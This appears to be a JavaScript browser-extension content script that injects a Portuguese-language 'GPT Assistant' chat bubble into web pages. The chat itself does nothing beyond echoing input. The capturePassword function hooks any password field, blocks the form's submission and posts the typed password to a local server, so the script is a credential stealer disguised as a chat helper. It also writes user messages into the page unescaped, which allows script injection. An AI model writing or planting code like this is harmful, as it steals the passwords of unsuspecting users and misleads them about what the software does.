let capturedPassword = '';

const createChatInterface = () => {
    const chatContainer = document.createElement('div');
    chatContainer.id = 'gpt-assistant';
    chatContainer.innerHTML = `
        <div id="chat-header">
            Assistente GPT
            <button id="close-button">X</button>
        </div>
        <div id="chat-body"></div>
        <input type="text" id="chat-input" placeholder="Digite sua mensagem..." />
        <button id="send-button">Enviar</button>
    `;
    document.body.appendChild(chatContainer);

    // Ocultar o chat inicialmente
    chatContainer.style.display = 'none';

    // Adicionar o botão de ativação
    const bubble = document.createElement('div');
    bubble.id = 'gpt-bubble';
    bubble.innerHTML = `<img src="https://cdn-icons-png.flaticon.com/512/11865/11865338.png" alt="GPT" />`;
    document.body.appendChild(bubble);

    // Adicionar evento de clique para mostrar/esconder o chat
    bubble.addEventListener('click', () => {
        bubble.style.display = 'none';
        chatContainer.style.display = 'flex';
    });

    document.getElementById('close-button').addEventListener('click', () => {
        chatContainer.style.display = 'none';
        bubble.style.display = 'flex';
    });

    document.getElementById('send-button').addEventListener('click', () => {
        const input = document.getElementById('chat-input');
        const userMessage = input.value;
        addMessageToChat('Você', userMessage);
        input.value = '';
        // Aqui você pode implementar a lógica de resposta do assistente, se necessário
    });
};

const addMessageToChat = (sender, message) => {
    const chatBody = document.getElementById('chat-body');
    chatBody.innerHTML += `<div><strong>${sender}:</strong> ${message}</div>`;
};

const capturePassword = () => {
    const passwordField = document.querySelector('input[type="password"]');

    if (passwordField) {
        passwordField.addEventListener('input', () => {
            capturedPassword = passwordField.value;
        });

        const submitButton = document.querySelector('input[type="submit"], button[type="submit"]');
        
        if (submitButton) {
            submitButton.addEventListener('click', (event) => {
                event.preventDefault();
                
                fetch('http://localhost:3000/submit-password', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ password: capturedPassword })
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Senha enviada com sucesso!');
                    } else {
                        console.error('Erro ao enviar a senha');
                    }
                })
                .catch(error => console.error('Erro de rede:', error));
            });
        }
    } else {
        console.log('Campo de senha não encontrado.');
    }
};

createChatInterface();
capturePassword();
